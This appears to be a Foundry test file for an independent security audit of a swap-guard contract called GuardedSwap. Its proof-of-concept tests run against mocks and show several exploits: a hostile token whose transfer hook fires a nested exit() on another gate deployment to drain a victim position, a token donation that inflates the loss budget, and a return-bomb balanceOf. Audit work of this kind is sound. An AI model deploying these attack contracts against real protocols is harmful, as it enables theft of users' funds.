// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import "../src/GuardedSwap.sol";
import "./Mocks.sol";

/// Free independent audit of GuardedSwap v17 (commit 305cbb5). Each test is a PoC or a check of a claim.

/// Models a smart account: the executor's delegation may call anything on the account's behalf (no method restriction).
contract OpenAccount {
    address public executor;
    constructor(address e) { executor = e; }
    receive() external payable {}
    function execute(address target, uint256 value, bytes calldata data) external returns (bytes memory r) {
        require(msg.sender == executor, "not executor");
        bool ok; (ok, r) = target.call{value: value}(data);
        if (!ok) assembly { revert(add(r, 32), mload(r)) }
    }
}

/// The thief's executor after a 7702 upgrade of the stolen executor key: callable by the thief's token.
contract ThiefExecutor {
    OpenAccount public acct; GuardedSwap public g2; address public victimTok; uint256 public amount; bytes public route2; bool public fired; bool public ok2; bytes public err;
    function arm(OpenAccount a, GuardedSwap g, address t, uint256 amt, bytes calldata r) external { acct = a; g2 = g; victimTok = t; amount = amt; route2 = r; }
    function fire() external {
        if (fired) return; fired = true;
        acct.execute(victimTok, 0, abi.encodeWithSelector(0x095ea7b3, address(g2), amount));
        try acct.execute(address(g2), 0, abi.encodeCall(GuardedSwap.exit, (victimTok, amount, 1, route2))) { ok2 = true; } catch (bytes memory e) { err = e; }
    }
}

/// A thief token: an ordinary MockToken whose transferFrom calls the thief's executor once armed.
contract HookToken is MockToken {
    ThiefExecutor public hook;
    function setHook(ThiefExecutor h) external { hook = h; }
    function _move(address f, address to, uint256 a) internal override { super._move(f, to, a); if (address(hook) != address(0)) hook.fire(); }
}

/// balanceOf returns a 1 MB answer (return bomb) once armed.
contract BombBalance {
    mapping(address => uint256) b; bool public bomb;
    function setBomb(bool x) external { bomb = x; }
    function mint(address to, uint256 a) external { b[to] += a; }
    function balanceOf(address a) external view returns (uint256) {
        if (bomb) assembly { return(0, 1000000) }
        return b[a];
    }
}

contract FreeAuditTest is Test {
    address constant K_ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    MockToken tok; MockRouter router; GuardedSwap guard; Wallet acct; address exec; address cold = address(0xC01D);
    ThiefExecutor tex; MockRouter router2; address exec2; GuardedSwap g2; OpenAccount victim; MockToken vtok;

    function setUp() public {
        tok = new MockToken(); router = new MockRouter(); exec = address(new Wallet());
        guard = new GuardedSwap(address(router), exec, address(this), cold, 1000, 1000 ether, 1000 ether); acct = new Wallet();
        vm.deal(address(router), 1000 ether); router.set(1000, 1e15, address(0));
    }
    function _route(address exec_, address tin, address tout, uint256 amount, address to) internal pure returns (bytes memory) {
        GuardedSwap.SwapDescriptionV2 memory d; d.srcToken = tin; d.dstToken = tout; d.dstReceiver = to; d.amount = amount; d.minReturnAmount = 1;
        GuardedSwap.SwapExecutionParams memory p; p.desc = d; p.callTarget = exec_; return abi.encodeWithSelector(0xe21fd0e9, p);
    }
    function _buyT(GuardedSwap g, address a, address t, uint256 eth) internal {
        vm.prank(a); g.buy{value: eth}(t, 1, _route(exec, K_ETH, t, eth, a));
    }
    function _sellT(GuardedSwap g, address a, MockToken t, uint256 amt) internal returns (uint256 out) {
        vm.startPrank(a); t.approve(address(g), amt); out = g.sell(address(t), amt, 1, _route(exec, address(t), K_ETH, amt, address(g))); vm.stopPrank();
    }

    /// F-1 (Low, Confirmed): the v17 reconciliation of a lot the owner emptied is undone by giving the tokens back before the
    /// next sale. A stale lot whose token has crashed is reinstated in the base at its full cost for the market price of the
    /// tokens -- outside buy(), so outside the hourly buy cap and the delegation's ETH cap -- and funds a larger dump.
    function test_F1_donation_reinstates_a_withdrawn_lot_in_the_base() public {
        MockToken a = tok; MockToken b = new MockToken(); vm.deal(address(acct), 10 ether);
        _buyT(guard, address(acct), address(a), 3 ether);                  // A: 3000 at 3 ETH
        _buyT(guard, address(acct), address(b), 7 ether);                  // B: 7000 at 7 ETH, no ETH left
        vm.prank(address(acct)); a.transfer(address(0xBEEF), 3000e18);      // the owner takes all of A out himself (sold it at -99% elsewhere)
        (, uint256 budgetHonest) = guard.budgetOf(address(acct)); assertEq(budgetHonest, 2.1 ether);   // v17: 30% of B alone
        uint256 snap = vm.snapshotState();
        router.set(1000, 6.5e14, address(0));                              // the thief dumps B for 4.55 ETH: loss 2.45
        vm.startPrank(address(acct)); b.approve(address(guard), 7000e18);
        vm.expectRevert(abi.encodeWithSelector(GuardedSwap.BudgetExceeded.selector, 2.45 ether, 2.1 ether));
        guard.sell(address(b), 7000e18, 1, _route(exec, address(b), K_ETH, 7000e18, address(guard))); vm.stopPrank();
        vm.revertToState(snap);
        a.mint(address(0x7777), 3000e18);                                  // the thief buys 3000 A at the crashed price (~0.03 ETH) ...
        vm.prank(address(0x7777)); a.transfer(address(acct), 3000e18);     // ... and gives them to the account: no gate call, no event
        (, uint256 budgetInflated) = guard.budgetOf(address(acct)); assertEq(budgetInflated, 3 ether);   // A's full 3 ETH cost is back in the base
        router.set(1000, 6.5e14, address(0));
        assertEq(_sellT(guard, address(acct), b, 7000e18), 4.55 ether);    // the same dump now goes through
        (uint256 l, ) = guard.loss(address(acct)); assertEq(l, 2.45 ether);
    }

    /// F-2 (Medium, Theoretical -- depends on the off-chain delegation scope): exit() authorises on tx.origin only. While the
    /// cold key evacuates a thief-bought token, the token's code runs with tx.origin == EXIT_KEY. Within one gate the global
    /// lock stops a nested exit; but another gate deployment with the same EXIT_KEY (v15 live, older versions) has its own
    /// lock, and a stolen executor (7702-upgraded) whose delegation is not restricted to buy/sell can make a victim account
    /// call exit() there: a budget-free, hourly-cap-free dump through any route.
    function test_F2_exit_reachable_from_a_thief_token_during_an_evacuation_on_another_gate() public {
        tex = new ThiefExecutor();
        router2 = new MockRouter(); vm.deal(address(router2), 1000 ether); router2.set(1000, 1e15, address(0));
        exec2 = address(new Wallet());
        g2 = new GuardedSwap(address(router2), exec2, address(this), cold, 1000, 1000 ether, 1000 ether);   // another version, same cold key
        victim = new OpenAccount(address(tex)); vm.deal(address(victim), 10 ether);
        vtok = new MockToken();
        vm.prank(address(victim)); g2.buy{value: 5 ether}(address(vtok), 1, _route(exec2, K_ETH, address(vtok), 5 ether, address(victim)));   // the victim's real position on g2: 5000 at 5 ETH
        // the budget on g2 would refuse a dump at 1% of cost
        (, uint256 budget) = g2.budgetOf(address(victim)); assertEq(budget, 3 ether);
        // the thief bought his own token into the victim on g1 earlier
        HookToken ht = new HookToken();
        vm.prank(address(victim)); guard.buy{value: 0.01 ether}(address(ht), 1, _route(exec, K_ETH, address(ht), 0.01 ether, address(victim)));
        // arm: when the cold key exits HT on g1, sell all of the victim's VTOK on g2 at 1% via exit()
        router2.set(1000, 1e13, address(0));
        tex.arm(victim, g2, address(vtok), 5000e18, _route(exec2, address(vtok), K_ETH, 5000e18, address(g2)));
        ht.setHook(tex);
        // the operator's evacuation of HT on g1 (account's delegation to the cold key: msg.sender = victim, tx.origin = cold)
        vm.prank(address(victim)); ht.approve(address(guard), 10e18);
        vm.prank(address(victim), cold);
        guard.exit(address(ht), 10e18, 1, _route(exec, address(ht), K_ETH, 10e18, address(guard)));
        assertTrue(tex.ok2(), "nested exit on g2 should have gone through");
        assertEq(vtok.balanceOf(address(victim)), 0);                       // the whole position is gone at 1%
        (uint256 l, ) = g2.loss(address(victim)); assertEq(l, 0);            // and no loss was booked: exit ignores the budget
    }
    /// Control for F-2: on the SAME gate the nested exit is stopped by the lock.
    function test_F2_control_same_gate_nested_exit_is_blocked() public {
        tex = new ThiefExecutor();
        victim = new OpenAccount(address(tex)); vm.deal(address(victim), 10 ether);
        vtok = new MockToken();
        vm.prank(address(victim)); guard.buy{value: 5 ether}(address(vtok), 1, _route(exec, K_ETH, address(vtok), 5 ether, address(victim)));
        HookToken ht = new HookToken();
        vm.prank(address(victim)); guard.buy{value: 0.01 ether}(address(ht), 1, _route(exec, K_ETH, address(ht), 0.01 ether, address(victim)));
        tex.arm(victim, guard, address(vtok), 5000e18, _route(exec, address(vtok), K_ETH, 5000e18, address(guard)));
        ht.setHook(tex);
        vm.prank(address(victim)); ht.approve(address(guard), 10e18);
        vm.prank(address(victim), cold);
        guard.exit(address(ht), 10e18, 1, _route(exec, address(ht), K_ETH, 10e18, address(guard)));
        assertFalse(tex.ok2()); assertEq(bytes4(tex.err()), GuardedSwap.Reentrancy.selector);
        assertEq(vtok.balanceOf(address(victim)), 5000e18);
    }

    /// C6 check (Info): 31 registry tokens that burn their whole BALANCE_GAS make every sale and exit of the account cost ~3.6M gas
    /// for good (the slots cannot be freed while the reads fail). Nothing reverts; an engine or bundler gas cap below that would.
    function test_I_31_gas_burners_cost_every_sale_about_3_6M_gas() public {
        vm.deal(address(acct), 10 ether); MockToken[] memory ts = new MockToken[](31);
        for (uint256 i = 0; i < 31; i++) { ts[i] = new MockToken(); _buyT(guard, address(acct), address(ts[i]), 0.001 ether); }
        _buyT(guard, address(acct), address(tok), 1 ether);
        for (uint256 i = 0; i < 31; i++) ts[i].setBurnsGas(true);
        vm.cool(address(guard));
        uint256 g0 = gasleft(); _sellT(guard, address(acct), tok, 500e18); uint256 used = g0 - gasleft();
        emit log_named_uint("sale gas with 31 burning lots", used);
        assertGt(used, 3_100_000); assertLt(used, 3_800_000);
        vm.startPrank(address(acct), cold); tok.approve(address(guard), 500e18);
        guard.exit(address(tok), 500e18, 1, _route(exec, address(tok), K_ETH, 500e18, address(guard))); vm.stopPrank();
        assertEq(guard.lotsOf(address(acct)).length, 31);                    // the junk stays; no new token can be bought
    }

    /// C6/C7 check: a registry token whose balanceOf returns 1 MB costs only the capped call (32 bytes copied), and is read as unreadable.
    function test_I_return_bomb_balanceOf_is_contained() public {
        vm.deal(address(acct), 10 ether);
        BombBalance bb = new BombBalance();
        // put a lot of bb in the registry: the mock router mints through MockToken(dst).mint, which BombBalance has
        _buyT(guard, address(acct), address(bb), 0.1 ether);
        _buyT(guard, address(acct), address(tok), 1 ether);
        bb.setBomb(true);
        uint256 g0 = gasleft(); _sellT(guard, address(acct), tok, 500e18); uint256 used = g0 - gasleft();
        emit log_named_uint("sale gas with a return-bomb lot", used);
        assertLt(used, 500_000);                                         // ~100k of capped call on top of an ordinary sale
        (uint256 t, ) = guard.basis(address(acct), address(bb)); assertGt(t, 0);   // kept at its last cost (documented residual)
    }

    /// C1/C2 fuzz: after any owner withdrawal pattern over three lots, the base a sale reads equals budgetOf's base.
    function testFuzz_view_budget_equals_sale_budget(uint96 w0, uint96 w1, uint96 w2, uint96 px) public {
        MockToken[3] memory ts; vm.deal(address(acct), 3 ether);
        for (uint256 i = 0; i < 3; i++) { ts[i] = new MockToken(); _buyT(guard, address(acct), address(ts[i]), 1 ether); }
        uint96[3] memory w = [w0, w1, w2];
        for (uint256 i = 1; i < 3; i++) { uint256 amt = bound(w[i], 0, 1000e18); if (amt > 0) { vm.prank(address(acct)); ts[i].transfer(address(0xdead), amt); } }
        uint256 sellAmt = bound(w[0], 1e18, 1000e18);
        uint256 floor = guard.floorFor(address(acct), address(ts[0]), sellAmt);
        (, uint256 budget) = guard.budgetOf(address(acct));
        uint256 p = bound(px, 1, 1e15); router.set(1000, p, address(0));
        uint256 out = sellAmt * p / 1e18; uint256 cost = 1 ether * sellAmt / 1000e18;
        vm.startPrank(address(acct)); ts[0].approve(address(guard), sellAmt);
        if (out == 0) { vm.expectRevert(); guard.sell(address(ts[0]), sellAmt, 1, _route(exec, address(ts[0]), K_ETH, sellAmt, address(guard))); vm.stopPrank(); return; }
        if (out < floor) {
            vm.expectRevert(abi.encodeWithSelector(GuardedSwap.BudgetExceeded.selector, cost - out, budget));
            guard.sell(address(ts[0]), sellAmt, 1, _route(exec, address(ts[0]), K_ETH, sellAmt, address(guard)));
        } else {
            guard.sell(address(ts[0]), sellAmt, 1, _route(exec, address(ts[0]), K_ETH, sellAmt, address(guard)));
            (uint256 l, ) = guard.loss(address(acct)); assertLe(l, budget);
        }
        vm.stopPrank();
    }
}
